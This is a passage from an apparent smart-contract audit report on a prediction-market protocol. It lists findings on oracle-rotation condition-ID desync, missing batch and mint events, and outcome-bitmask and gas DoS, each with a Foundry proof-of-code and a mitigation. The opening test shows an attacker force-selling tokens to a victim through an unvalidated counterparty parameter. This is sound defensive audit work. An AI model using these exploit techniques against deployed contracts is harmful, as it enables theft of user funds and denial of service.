        controller.executeOrderMatch(buy, sell, buySig, sellSig, 500);

        // Verify attacker got YES tokens
        uint256 nOutcomes = market.getOutcomeCount(questionId);
        bytes32 condId = market.getConditionId(oracle, questionId, nOutcomes, 0);
        uint256 tokenId = positions.getTokenId(condId, outcome);
        assertEq(positions.balanceOf(attacker, tokenId), 500);

        // 2) FORCE-BUY against victim: attacker sells to victim without consent at 100%
        IMarketController.Order memory forcedSell = IMarketController.Order({
            user: attacker,
            questionId: questionId,
            outcome: outcome,
            amount: 400,
            price: 10000, // 100%
            nonce: 3,
            expiration: block.timestamp + 1 days,
            isBuyOrder: false
        });
        bytes memory forcedSig = _sign(forcedSell, attackerPK);

        uint256 victimBefore = vault.getAvailableBalance(victim);
        uint256 attackerBefore = vault.getAvailableBalance(attacker);

        // Authorized matcher calls with counterparty = victim (unvalidated)
        vm.prank(attacker);
        controller.executeSingleOrder(forcedSell, forcedSig, 400, victim);

        // Victim pays 400 to attacker without consent; victim receives 400 tokens instead
        uint256 victimAfter = vault.getAvailableBalance(victim);
        uint256 attackerAfter = vault.getAvailableBalance(attacker);
        assertEq(attackerAfter, attackerBefore + 400);
        assertEq(victimAfter, victimBefore - 400);
        assertEq(positions.balanceOf(attacker, tokenId), 100); // 500 - 400 burned
        assertEq(positions.balanceOf(victim,  tokenId), 400);   // forcibly minted to victim
    }
}


## Suggested Mitigation
Eliminate the untrusted counterparty parameter in executeSingleOrder and bind the matcher to the caller: use address matcher = msg.sender; and require(authorizedMatchers[matcher]). Alternatively, if a parameter must remain, enforce require(counterparty == msg.sender && authorizedMatchers[counterparty], "Counterparty must be authorized caller"). For stronger protection against any third-party fund movement, consider requiring explicit user consent/allowance for Vault transfers and PositionTokens burns/mints when the affected address is not the caller.





 **Derived From** : Oracle change breaks condition ID determinism causing unclaimable payouts

## [M-5]. Oracle update mutates conditionId; verifyProof reverts for pre-mint tokens, DoS on claims and stuck collateral in MarketResolver.verifyProof

## Derived From Pattern/Invariant
Oracle change breaks condition ID determinism causing unclaimable payouts

## Exploit Type
AccountingInvariantViolation

## Location
MarketResolver.verifyProof

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
RequireAdminRole

## Description
getConditionId includes the mutable oracle address. Tokens are minted using a conditionId computed from the then-current oracle. If owner later updates oracle before resolution, resolveMarketEpoch stores the merkleRoot under a new conditionId derived from the new oracle. verifyProof reads by conditionId and will revert with 'Condition not resolved' for holders whose tokens were minted under the old oracle-derived conditionId, breaking the invariant that resolved conditions are claimable and causing funds to be stuck until governance toggles oracle and re-resolves. Vulnerable snippets:

function getConditionId(address oracleAddr, bytes32 questionId, uint256 numberOfOutcomes, uint256 epoch) public pure returns (bytes32) {
    return keccak256(abi.encodePacked(oracleAddr, questionId, numberOfOutcomes, epoch));
}
...
function _resolveMarketEpochInternal(...) internal {
    bytes32 conditionId = getConditionId(oracle, questionId, numberOfOutcomes, epoch);
    resolutionMerkleRoots[conditionId] = merkleRoot;
    isResolved[conditionId] = true;
}
...
function verifyProof(bytes32 conditionId, uint256 selectedOutcome, bytes32[] calldata merkleProof) external view returns (bool) {
    bytes32 merkleRoot = resolutionMerkleRoots[conditionId];
    require(merkleRoot != bytes32(0), "Condition not resolved");
    ...
}
...
function setOracle(address _oracle) external onlyOwner { oracle = _oracle; }

## Impact
Changing the oracle after positions are minted but before an epoch is resolved causes the Merkle root to be written under a different conditionId. Claims performed with the conditionId embedded in existing tokens will revert with "Condition not resolved", effectively freezing redemptions and locking collateral until governance performs a manual workaround. No direct theft occurs, but availability of user funds is impacted. This is a Medium-severity DoS under reasonable privileged operations (oracle rotation).

## Proof of Concept
1) Users trade and mint position tokens for (questionId, epoch) while oracle = A, so tokens bind to conditionId(A,...). 2) Owner updates oracle to B via setOracle. 3) Resolver resolves epoch, which writes merkleRoot under conditionId(B,...). 4) Holders attempting to claim using their token's conditionId(A,...) cause verifyProof to revert 'Condition not resolved', making funds unclaimable and breaking the invariant that resolved conditions are claimable.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract ResolverConditionIdOracleChangeTest is Test {
    MarketResolver resolver;
    address owner = address(0xA11CE);
    address oracleA = address(0xAA);
    address oracleB = address(0xBB);

    function setUp() public {
        // Deploy implementation and proxy, then initialize via proxy
        MarketResolver impl = new MarketResolver();
        bytes memory initData = abi.encodeWithSelector(MarketResolver.initialize.selector, owner, oracleA);
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        resolver = MarketResolver(address(proxy));
    }

    function test_OracleChangeBreaksConditionId_VerifyProofReverts() public {
        bytes32 qId = keccak256("Q1");
        uint256 n = 2;
        uint256 epoch = 1;

        // Tokens would have been minted using this old conditionId (oracleA)
        bytes32 condIdOld = resolver.getConditionId(oracleA, qId, n, epoch);

        // Admin updates oracle to B
        vm.prank(owner);
        resolver.setOracle(oracleB);

        // Resolve with new oracle B (stores root under conditionId with oracleB)
        bytes32 leaf = keccak256(abi.encodePacked(uint256(1)));
        vm.prank(oracleB);
        resolver.resolveMarketEpoch(qId, epoch, n, leaf);

        // Verify using old conditionId should revert: 'Condition not resolved'
        bytes32[] memory proof = new bytes32[](0);
        vm.expectRevert(bytes("Condition not resolved"));
        resolver.verifyProof(condIdOld, 1, proof);

        // Sanity: verify using new conditionId succeeds
        bytes32 condIdNew = resolver.getConditionId(oracleB, qId, n, epoch);
        bool ok = resolver.verifyProof(condIdNew, 1, proof);
        assertTrue(ok);
    }
}


## Suggested Mitigation
Make the condition identifier immutable with respect to oracle rotations. Recommended options: 1) Remove the oracle address from the conditionId and key resolution data by a stable conditionKey = keccak256(questionId, numberOfOutcomes, epoch). Use this key consistently across MarketResolver, MarketController, and PositionTokens. 2) If full refactor is not immediately possible, during resolveMarketEpoch compute and write the merkleRoot under both IDs: the legacy keccak(oracle, questionId, numberOfOutcomes, epoch) and the stable key keccak(questionId, numberOfOutcomes, epoch), marking both as resolved to preserve backwards compatibility. 3) Operational guardrails: restrict setOracle to periods when there are no unresolved epochs or add a migration helper that re-publishes the same merkleRoot under all affected legacy conditionIds. The most robust long-term fix is to standardize on the stable key and remove oracle from the conditionId everywhere.





 **Derived From** : Batch events are emitted: BatchCollateralLocked(conditionIds, users, amounts) and BatchCollateralUnlocked(conditionIds, users, amounts)

## [L-6]. Missing batch events in Vault.batchLockCollateral/batchUnlockCollateral desyncs indexers and enables functional DoS on off-chain systems

## Derived From Pattern/Invariant
Batch events are emitted: BatchCollateralLocked(conditionIds, users, amounts) and BatchCollateralUnlocked(conditionIds, users, amounts)

## Exploit Type
EventConsistency

## Location
Vault.batchLockCollateral, batchUnlockCollateral

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
## Minimim Privilege Required
Permissionless

## Description
IVault declares BatchCollateralLocked/BatchCollateralUnlocked events to signal atomic batched state changes. Vault.batchLockCollateral and batchUnlockCollateral only emit per-item CollateralLocked/CollateralUnlocked events inside the loop and never emit the batch events. Off-chain indexers and bots expecting the batch events fail to correlate/attribute the atomic batch, leading to desynced exposures, incorrect fee/accounting dashboards, and operational DoS for orderbook/resolution automations. Attackers can preferentially route actions through batch paths (e.g., batch claims) to keep off-chain systems stale and trade against stale quotes or block automated operations.

Vulnerable snippet (no batch events after loop):

function batchLockCollateral(...) external onlyMarketController nonReentrant {
    ...
    for (uint256 i = 0; i < conditionIds.length; i++) {
        ...
        emit CollateralLocked(conditionIds[i], users[i], amounts[i]);
    }
    // Missing: emit BatchCollateralLocked(conditionIds, users, amounts);
}

function batchUnlockCollateral(...) external onlyMarketController nonReentrant {
    ...
    for (uint256 i = 0; i < conditionIds.length; i++) {
        ...
        emit CollateralUnlocked(conditionIds[i], users[i], amounts[i]);
    }
    // Missing: emit BatchCollateralUnlocked(conditionIds, users, amounts);
}

## Impact
Specification mismatch/event inconsistency: IVault declares BatchCollateralLocked/BatchCollateralUnlocked but Vault does not emit them in batch functions. On-chain state and funds are unaffected; per-item events are still emitted, so on-chain functionality and accounting remain correct. Off-chain consumers relying specifically on the batch events may desync or fail to correlate atomic batches, potentially causing stale UIs or operational hiccups. This is a Low severity, functional/off-chain issue.

## Proof of Concept
Any user path that reaches MarketController’s batch operations will cause Vault.batchLockCollateral/batchUnlockCollateral to execute without emitting the declared batch events. Example flow: a user calls MarketController.batchClaimWinnings (or any batch path that unlocks collateral), which in turn calls Vault.batchUnlockCollateral. The Vault emits two CollateralUnlocked events (per item) but never emits the BatchCollateralUnlocked event declared in IVault, breaking off-chain consumers expecting the batch event to denote atomicity.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import {Vault} from "src/Vault/Vault.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract VaultBatchEventsTest is Test {
    Vault vault;
    ERC20Mock usdc;
    address owner = address(this);
    address marketController = address(this);
    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        usdc = new ERC20Mock();
        vault = new Vault();
        vault.initialize(owner, address(usdc), marketController);

        usdc.mint(alice, 1_000e18);
        usdc.mint(bob, 1_000e18);

        vm.startPrank(alice);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(500e18);
        vm.stopPrank();

        vm.startPrank(bob);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(500e18);
        vm.stopPrank();
    }

    function test_BatchEventsMissing_OnBatchLockAndUnlock() public {
        bytes32[] memory cids = new bytes32[](2);
        address[] memory users = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        cids[0] = bytes32(uint256(1));
        cids[1] = bytes32(uint256(2));
        users[0] = alice;
        users[1] = bob;
        amounts[0] = 100e18;
        amounts[1] = 200e18;

        // Record logs for batchLockCollateral
        vm.recordLogs();
        vault.batchLockCollateral(cids, users, amounts);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        bytes32 lockSig = keccak256(bytes("CollateralLocked(bytes32,address,uint256)"));
        bytes32 batchLockSig = keccak256(bytes("BatchCollateralLocked(bytes32[],address[],uint256[])"));
        uint256 lockCount;
        uint256 batchLockCount;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics.length > 0) {
                if (logs[i].topics[0] == lockSig) lockCount++;
                if (logs[i].topics[0] == batchLockSig) batchLockCount++;
            }
        }
        assertEq(lockCount, 2, "should emit 2 per-item CollateralLocked");
        assertEq(batchLockCount, 0, "MISSING BatchCollateralLocked event");

        // Record logs for batchUnlockCollateral
        vm.recordLogs();
        vault.batchUnlockCollateral(cids, users, amounts);
        Vm.Log[] memory logs2 = vm.getRecordedLogs();

        bytes32 unlockSig = keccak256(bytes("CollateralUnlocked(bytes32,address,uint256)"));
        bytes32 batchUnlockSig = keccak256(bytes("BatchCollateralUnlocked(bytes32[],address[],uint256[])"));
        uint256 unlockCount;
        uint256 batchUnlockCount;
        for (uint256 i; i < logs2.length; i++) {
            if (logs2[i].topics.length > 0) {
                if (logs2[i].topics[0] == unlockSig) unlockCount++;
                if (logs2[i].topics[0] == batchUnlockSig) batchUnlockCount++;
            }
        }
        assertEq(unlockCount, 2, "should emit 2 per-item CollateralUnlocked");
        assertEq(batchUnlockCount, 0, "MISSING BatchCollateralUnlocked event");
    }
}


## Suggested Mitigation
Align implementation with the declared interface expectations: emit BatchCollateralLocked(conditionIds, users, amounts) and BatchCollateralUnlocked(conditionIds, users, amounts) once after the for-loop in the respective batch functions (retain per-item events if needed for granularity). Alternatively, if batch events are not intended, remove them from IVault and update docs to prevent off-chain consumers from relying on them.





 **Derived From** : Mutable oracle in conditionId causes resolution/token desync after oracle rotation

## [M-7]. Oracle rotation desynchronizes conditionId, breaking claims and enabling contradictory roots in MarketResolver._resolveMarketEpochInternal

## Derived From Pattern/Invariant
Mutable oracle in conditionId causes resolution/token desync after oracle rotation

## Exploit Type
Oracle

## Location
MarketResolver._resolveMarketEpochInternal

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
RequireAdminRole

## Description
MarketResolver derives conditionId from the mutable storage oracle during resolution: bytes32 conditionId = getConditionId(oracle, questionId, numberOfOutcomes, epoch). If owner rotates oracle after positions were minted (which embedded the old oracle address into their conditionId), resolution roots are written under a new key. Existing tokens keyed by the old-oracle conditionId will find no root and claims/verifyProof fail. Additionally, resolving the same (questionId, epoch, numberOfOutcomes) across different oracle addresses stores multiple, potentially contradictory roots, since isResolved is keyed by conditionId, not by the logical market tuple.

## Impact
Functional DoS: winners minted under the previous oracle cannot verify proofs or claim; funds remain locked. Also allows contradictory roots for identical market tuples across oracle rotations.

## Proof of Concept
1) Deploy MarketResolver with oracle A; markets mint tokens using conditionId = keccak(A, questionId, outcomes, epoch).
2) Owner rotates oracle to B.
3) Oracle B resolves the epoch; the root is stored under conditionId = keccak(B,...). 
4) Users holding tokens keyed by keccak(A,...) cannot verifyProof (no root at that key) and cannot claim.
5) Owner can flip back and resolve again under A, producing a second, potentially contradictory root for the same logical market.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract MarketResolverDesyncTest is Test {
    MarketResolver resolver;
    address owner = address(0xABCD);
    address oracleA = address(0xAaA1);
    address oracleB = address(0xBbB2);

    bytes32 questionId = keccak256(abi.encode("Q1"));
    uint256 epoch = 1;
    uint256 outcomes = 2;

    function setUp() public {
        // Deploy implementation
        MarketResolver impl = new MarketResolver();
        // Initialize via proxy
        bytes memory initData = abi.encodeWithSelector(MarketResolver.initialize.selector, owner, oracleA);
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        resolver = MarketResolver(address(proxy));

        // Set an emergency resolver for completeness
        vm.prank(owner);
        resolver.setEmergencyResolver(address(0xEeee));
    }

    function test_OracleRotationBreaksClaimsAndAllowsContradictoryRoots() public {
        // Pre-compute condition ids for A and B
        bytes32 condA = resolver.getConditionId(oracleA, questionId, outcomes, epoch);
        bytes32 condB = resolver.getConditionId(oracleB, questionId, outcomes, epoch);

        // 1) Rotate oracle to B and resolve under B with outcome=1
        vm.prank(owner);
        resolver.updateOracle(oracleB);

        bytes32 rootOutcome1 = keccak256(abi.encodePacked(uint256(1)));
        vm.prank(oracleB);
        resolver.resolveMarketEpoch(questionId, epoch, outcomes, rootOutcome1);

        // Old key (condA) has no root => verifyProof reverts: DoS for old holders
        bytes32[] memory proof = new bytes32[](0);
        vm.expectRevert(bytes("Condition not resolved"));
        resolver.verifyProof(condA, 1, proof);

        // New key (condB) works
        bool okB = resolver.verifyProof(condB, 1, proof);
        assertTrue(okB, "Proof under new oracle key should verify");

        // 2) Flip back to A and resolve the same logical market differently (outcome=2)
        vm.prank(owner);
        resolver.updateOracle(oracleA);

        bytes32 rootOutcome2 = keccak256(abi.encodePacked(uint256(2)));
        vm.prank(oracleA);
        resolver.resolveMarketEpoch(questionId, epoch, outcomes, rootOutcome2);

        // Contradictory roots exist for identical (questionId, epoch, outcomes)
        bool okA_o2 = resolver.verifyProof(condA, 2, proof);
        bool okB_o1 = resolver.verifyProof(condB, 1, proof);
        assertTrue(okA_o2, "A-key says outcome 2 wins");
        assertTrue(okB_o1, "B-key says outcome 1 wins");
    }
}


## Suggested Mitigation
- Decouple conditionId from the mutable oracle variable. Either:
  1) Remove the oracle address from the conditionId entirely and compute conditionId = keccak256(abi.encodePacked(address(this), questionId, numberOfOutcomes, epoch)); or
  2) Snapshot the oracle used per logical market tuple (questionId, epoch, numberOfOutcomes) at mint-time and reuse that snapshot for resolution. For example, maintain mapping(bytes32 logicalKey => address oracleSnapshot) where logicalKey = keccak256(abi.encode(questionId, epoch, numberOfOutcomes)). When first mint occurs for that tuple, set oracleSnapshot. In _resolveMarketEpochInternal, compute conditionId using oracleSnapshot, not the current oracle.
- Additionally, prevent double-resolution across oracle rotations by gating on the logical tuple: maintain mapping(bytes32 logicalKey => bool) logicalResolved; require(!logicalResolved[logicalKey]) before writing any root, then set it true. Emit events including the logical tuple to aid indexers.
- Ensure MarketController/PositionTokens use the same revised conditionId scheme so minting and resolution remain consistent.





 **Derived From** : custom events PositionTokensMinted/PositionTokensBurned are emitted mirroring state changes

## [L-8]. Missing custom PositionTokensMinted/Burned events in PositionTokens mint/burn paths breaks referential event invariant and desynchronizes indexers

## Derived From Pattern/Invariant
custom events PositionTokensMinted/PositionTokensBurned are emitted mirroring state changes

## Exploit Type
EventConsistency

## Location
PositionTokens.mintBatch,burn,burnBatch

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
## Minimim Privilege Required
RequiresRole

## Description
IPositionTokens declares PositionTokensMinted/PositionTokensBurned, but PositionTokens emits only ERC1155 TransferSingle/TransferBatch and never emits the custom events. This violates the referential event invariant and breaks off-chain consumers that rely on these events to associate mints/burns with a conditionId. Vulnerable snippet:

function mintBatch(...) external onlyMarketController { _mintBatch(to, ids, amounts, ""); }
function burn(...) external onlyMarketController { _burn(from, id, amount); }
function burnBatch(...) external onlyMarketController { _burnBatch(from, ids, amounts); }

Since the custom events include conditionId but the functions do not receive it, the implementation cannot emit the declared events. Indexers that key off these events to maintain per-condition position supply and lifecycle will miss all mints/burns, leading to accounting drift and UX inconsistencies.

## Impact
This is an interface/spec mismatch and event consistency issue. PositionTokens does not emit the custom PositionTokensMinted/Burned events declared in IPositionTokens, so off-chain consumers that rely only on these events will miss mints/burns correlated to conditionId. On-chain state and assets are unaffected; ERC1155 Transfer* events are still emitted and can be indexed, or consumers can listen to MarketController events. Impact is limited to analytics/UX and off-chain indexing unless those systems hard-depend on the missing events.

## Proof of Concept
- Owner sets marketController.
- marketController calls mintBatch/burn/burnBatch under normal operation.
- Only ERC1155 Transfer* events are emitted; PositionTokensMinted/Burned never appear.
- Off-chain consumers watching PositionTokensMinted/Burned for conditionId-correlated updates miss all state transitions, leading to inconsistent off-chain state.
- This is reproducible for any call path as the implementation never emits the custom events.

## Proof of Code
pragma solidity 0.8.26;
import "forge-std/Test.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";

contract PositionTokensEventsTest is Test {
    PositionTokens pt;
    address attacker = address(0xB0B);
    address user = address(0xCAFE);

    function setUp() public {
        pt = new PositionTokens();
        pt.initialize(address(this));
        pt.setMarketController(attacker);
    }

    function test_MissingCustomEvents_onMintBurnBurnBatch() public {
        bytes32 conditionId = keccak256(abi.encodePacked("cond-1"));
        uint256[] memory ids = new uint256[](1);
        ids[0] = pt.getTokenId(conditionId, 1);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100;

        // mintBatch
        vm.prank(attacker);
        vm.recordLogs();
        pt.mintBatch(user, ids, amounts);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 mintedSig = keccak256(abi.encodePacked("PositionTokensMinted(address,uint256[],uint256[],bytes32)"));
        bytes32 transferBatchSig = keccak256(abi.encodePacked("TransferBatch(address,address,address,uint256[],uint256[])"));
        uint256 mintedCount = 0; uint256 erc1155BatchCount = 0;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics.length > 0) {
                if (logs[i].topics[0] == mintedSig) mintedCount++;
                if (logs[i].topics[0] == transferBatchSig) erc1155BatchCount++;
            }
        }
        assertEq(mintedCount, 0, "PositionTokensMinted not emitted");
        assertGt(erc1155BatchCount, 0, "ERC1155 TransferBatch should emit");

        // burn (single)
        vm.prank(attacker);
        vm.recordLogs();
        pt.burn(user, ids[0], 10);
        logs = vm.getRecordedLogs();
        bytes32 burnedSig = keccak256(abi.encodePacked("PositionTokensBurned(address,uint256[],uint256[],bytes32)"));
        bytes32 transferSingleSig = keccak256(abi.encodePacked("TransferSingle(address,address,address,uint256,uint256)"));
        uint256 burnedCount = 0; uint256 erc1155SingleCount = 0;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics.length > 0) {
                if (logs[i].topics[0] == burnedSig) burnedCount++;
                if (logs[i].topics[0] == transferSingleSig) erc1155SingleCount++;
            }
        }
        assertEq(burnedCount, 0, "PositionTokensBurned not emitted (single)");
        assertGt(erc1155SingleCount, 0, "ERC1155 TransferSingle should emit");

        // burnBatch remaining 90
        amounts[0] = 90;
        vm.prank(attacker);
        vm.recordLogs();
        pt.burnBatch(user, ids, amounts);
        logs = vm.getRecordedLogs();
        burnedCount = 0; erc1155BatchCount = 0;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics.length > 0) {
                if (logs[i].topics[0] == burnedSig) burnedCount++;
                if (logs[i].topics[0] == transferBatchSig) erc1155BatchCount++;
            }
        }
        assertEq(burnedCount, 0, "PositionTokensBurned not emitted (batch)");
        assertGt(erc1155BatchCount, 0, "ERC1155 TransferBatch should emit");
    }
}


## Suggested Mitigation
Align the implementation with the declared interface or relocate the events to where conditionId context is available:
- Preferred: Move PositionTokensMinted/Burned to MarketController (which already has conditionId) and remove them from IPositionTokens to avoid misleading expectations. Rely on ERC1155 Transfer* at the token layer and condition-aware events at the controller layer.
- Alternatively: Keep events on PositionTokens and either (A) extend mintBatch/burn/burnBatch to accept bytes32 conditionId and emit the events, or (B) add a mapping uint256(id) => bytes32(conditionId) and an onlyMarketController register function to set the mapping before first mint, then emit events using the stored conditionId. Ensure the mapping is populated atomically with or prior to mint to avoid missing conditionId on first emission.





 **Derived From** : (order.outcome > 0) && ((order.outcome & (order.outcome - 1)) == 0) && (order.outcome < (1 << market.getOutcomeCount(order.questionId)))

## [M-9]. Invalid outcome bitmask lets any user brick JIT matches via out-of-bounds write in MarketController._executeJITMinting

## Derived From Pattern/Invariant
(order.outcome > 0) && ((order.outcome & (order.outcome - 1)) == 0) && (order.outcome < (1 << market.getOutcomeCount(order.questionId)))

## Exploit Type
ArrayLimits

## Location
MarketController.executeOrderMatch

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
Permissionless

## Description
executeOrderMatch accepts orders whose outcome is not a single-bit flag within outcomeCount. In the JIT path, _executeJITMinting builds sellerTokenIds as a memory array with length = (numberOfOutcomes - 1) and loops i in [0..numberOfOutcomes-1] computing outcomeIndex = 1 << i. If order.outcome is 0, multi-bit, or >= (1 << numberOfOutcomes), no outcomeIndex matches, so sellerIndex increments numberOfOutcomes times and writes sellerTokenIds[numberOfOutcomes - 1] on the last iteration, overflowing the array length and reverting. Because there is no upfront validation of the outcome bitmask in executeOrderMatch/_verifyOrder, any user can sign such orders and cause authorized matchers to revert when attempting to fill them, resulting in persistent DoS/griefing of the matching pipeline.

Vulnerable snippet (MarketController._executeJITMinting):
for (uint256 i = 0; i < numberOfOutcomes; i++) {
    uint256 outcomeIndex = 1 << i;
    uint256 tokenId = positionTokens.getTokenId(conditionId, outcomeIndex);
    if (outcomeIndex == buyOrder.outcome) {
        buyerTokenIds[0] = tokenId;
        buyerAmounts[0] = fillAmount;
    } else {
        sellerTokenIds[sellerIndex] = tokenId; // OOB if no match ever occurs
        sellerAmounts[sellerIndex] = fillAmount;
        sellerIndex++;
    }
}

## Impact
Functional DoS/griefing: malicious orders with invalid outcome bitmasks consistently revert JIT matches, wasting matcher gas and reducing protocol liveness. No direct fund loss (full revert), but matching service becomes unreliable.

## Proof of Concept
- Attacker crafts two valid EIP-712 orders (buy and sell) for the same market with invalid outcome (e.g., 0, multi-bit like 3, or 1<<outcomeCount).
- Authorized matcher attempts to executeOrderMatch with these signatures.
- Seller has no inventory -> JIT path.
- _executeJITMinting loops over outcomes expecting exactly one match; none matches -> sellerIndex increments numberOfOutcomes times, writing past sellerTokenIds length (out-of-bounds) -> revert.
- Entire transaction reverts, bricking the match. The attacker can spam such orders to repeatedly grief matchers.

## Proof of Code
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {MarketController} from "src/Market/MarketController.sol";
import {MarketContract} from "src/Market/Market.sol";
import {MarketResolver} from "src/Market/MarketResolver.sol";
import {PositionTokens} from "src/Token/PositionTokens.sol";
import {Vault} from "src/Vault/Vault.sol";
import {IMarketController} from "src/Market/IMarketController.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract OutcomeBitmaskDoSTest is Test {
    MarketController controller;
    MarketContract market;
    MarketResolver resolver;
    PositionTokens tokens;
    Vault vault;
    ERC20Mock usdc;

    address owner;
    address oracle;
    address matcher;

    uint256 buyerPk;
    address buyer;
    uint256 sellerPk;
    address seller;

    bytes32 constant QID = keccak256("QID");

    function setUp() public {
        owner = address(this);
        oracle = address(0x1111);
        matcher = address(0xCAFE);
        buyerPk = 0xA11CE;
        buyer = vm.addr(buyerPk);
        sellerPk = 0xB0B;
        seller = vm.addr(sellerPk);

        // Collateral token and balances
        usdc = new ERC20Mock();
        usdc.mint(buyer, 1_000_000e18);
        usdc.mint(seller, 1_000_000e18);

        // Core contracts
        market = new MarketContract();
        market.initialize(owner);
        resolver = new MarketResolver();
        resolver.initialize(owner, oracle);
        tokens = new PositionTokens();
        tokens.initialize(owner);
        vault = new Vault();
        // placeholder marketController for init; updated below
        vault.initialize(owner, address(usdc), owner);

        controller = new MarketController();
        controller.initialize(owner, address(tokens), address(resolver), address(vault), address(market), oracle);

        // Wire permissions
        tokens.setMarketController(address(controller));
        vault.setMarketController(address(controller));
        market.setMarketController(address(controller));
        controller.setAuthorizedMatcher(matcher, true);

        // Create open market with 3 outcomes (valid bits: 1,2,4)
        vm.prank(matcher);
        controller.createMarket(QID, 3, 0, 0);

        // Fund users in vault
        vm.startPrank(buyer);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(100_000e18);
        vm.stopPrank();

        vm.startPrank(seller);
        usdc.approve(address(vault), type(uint256).max);
        vault.depositCollateral(100_000e18);
        vm.stopPrank();
    }

    function _sign(IMarketController.Order memory order, uint256 pk) internal view returns (bytes memory sig) {
        bytes32 ORDER_TYPEHASH = keccak256(
            "Order(address user,bytes32 questionId,uint256 outcome,uint256 amount,uint256 price,uint256 nonce,uint256 expiration,bool isBuyOrder)"
        );
        bytes32 structHash = keccak256(abi.encode(
            ORDER_TYPEHASH,
            order.user,
            order.questionId,
            order.outcome,
            order.amount,
            order.price,
            order.nonce,
            order.expiration,
            order.isBuyOrder
        ));
        bytes32 EIP712_DOMAIN_TYPEHASH = keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );
        bytes32 domainSeparator = keccak256(abi.encode(
            EIP712_DOMAIN_TYPEHASH,
            keccak256(bytes("PredictionMarketOrders")),
            keccak256(bytes("1")),
            block.chainid,
            address(controller)
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        sig = abi.encodePacked(r, s, v);
    }

    function test_DoS_InvalidOutcomeBitmask_RevertsAndStateUnchanged() public {
        // invalid outcome: 1<<3=8 (no match in {1,2,4}); also multi-bit like 3 would fail
        uint256 invalidOutcome = 8;

        IMarketController.Order memory buy = IMarketController.Order({
            user: buyer,
            questionId: QID,
            outcome: invalidOutcome,
            amount: 1000,
            price: 6000,
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: true
        });
        IMarketController.Order memory sell = IMarketController.Order({
            user: seller,
            questionId: QID,
            outcome: invalidOutcome,
            amount: 1000,
            price: 6000,
            nonce: 1,
            expiration: block.timestamp + 1 days,
            isBuyOrder: false
        });
        bytes memory sigB = _sign(buy, buyerPk);
        bytes memory sigS = _sign(sell, sellerPk);

        uint256 buyerBalBefore = vault.getAvailableBalance(buyer);
        uint256 sellerBalBefore = vault.getAvailableBalance(seller);

        vm.startPrank(matcher);
        vm.expectRevert();
        controller.executeOrderMatch(buy, sell, sigB, sigS, 100);
        vm.stopPrank();

        assertEq(vault.getAvailableBalance(buyer), buyerBalBefore, "buyer balance unchanged");
        assertEq(vault.getAvailableBalance(seller), sellerBalBefore, "seller balance unchanged");
    }
}


## Suggested Mitigation
Validate the outcome bitmask before any settlement logic. In both executeOrderMatch (for buyOrder and sellOrder) and executeSingleOrder, add: uint256 n = market.getOutcomeCount(order.questionId); require(order.outcome > 0 && (order.outcome & (order.outcome - 1)) == 0 && order.outcome < (1 << n), "Invalid outcome"); Alternatively, move the same check into _verifyOrder so all entry points share a single guard. As a defensive fallback, in _executeJITMinting track whether a buyer outcome match was found and revert with a clear error before writing past sellerTokenIds if none is found.





 **Derived From** : JIT minting loops over outcome count (gas DoS on high-outcome markets)

## [M-10]. Unbounded loop in MarketController._executeJITMinting enables gas-based DoS for high-outcome markets

## Derived From Pattern/Invariant
JIT minting loops over outcome count (gas DoS on high-outcome markets)

## Exploit Type
GasGriefBlockLimit

## Location
MarketController._executeJITMinting

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
## Minimim Privilege Required
RequiresRole

## Description
MarketController._executeJITMinting allocates arrays sized by numberOfOutcomes-1 and iterates a for-loop from 0..numberOfOutcomes-1, then mints an ERC1155 batch for the seller side with numberOfOutcomes-1 IDs. For large outcome counts (up to 256 per docs), this makes a single trade fill scale linearly in gas and can approach/exceed block gas limits on Sonic, causing trade execution to revert. As JIT is the only path to bootstrap inventory, such markets can be effectively untradable, bricking liveness. Vulnerable snippet:

function _executeJITMinting(..., uint256 numberOfOutcomes) internal {
    ...
    uint256[] memory sellerTokenIds = new uint256[](numberOfOutcomes - 1);
    uint256[] memory sellerAmounts = new uint256[](numberOfOutcomes - 1);
    uint256 sellerIndex = 0;
    for (uint256 i = 0; i < numberOfOutcomes; i++) {
        uint256 outcomeIndex = 1 << i;
